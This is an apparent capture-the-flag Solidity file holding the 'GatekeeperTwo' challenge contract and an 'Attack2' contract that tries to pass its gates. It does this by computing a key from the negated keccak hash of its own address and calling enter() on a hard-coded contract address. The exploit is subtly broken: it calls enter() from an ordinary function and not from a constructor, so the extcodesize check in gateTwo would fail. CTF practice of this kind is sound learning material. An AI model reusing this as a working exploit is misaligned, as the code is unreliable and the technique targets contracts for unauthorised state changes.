pragma solidity ^0.4.18;

contract GatekeeperTwo {
    address public entrant;
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
    modifier gateTwo {
        uint x;
        assembly {x := extcodesize(caller)}
        require(x == 0);
        _;
    }
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
    }
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
contract Attack2
{
    uint64 public v;
    function b() public
    {
        GatekeeperTwo g_two = GatekeeperTwo(0x8c1ed7e19abaa9f23c476da86dc1577f1ef401f5);
        v = ~ uint64(keccak256(this));
        g_two.enter(bytes8(v));
    }
}
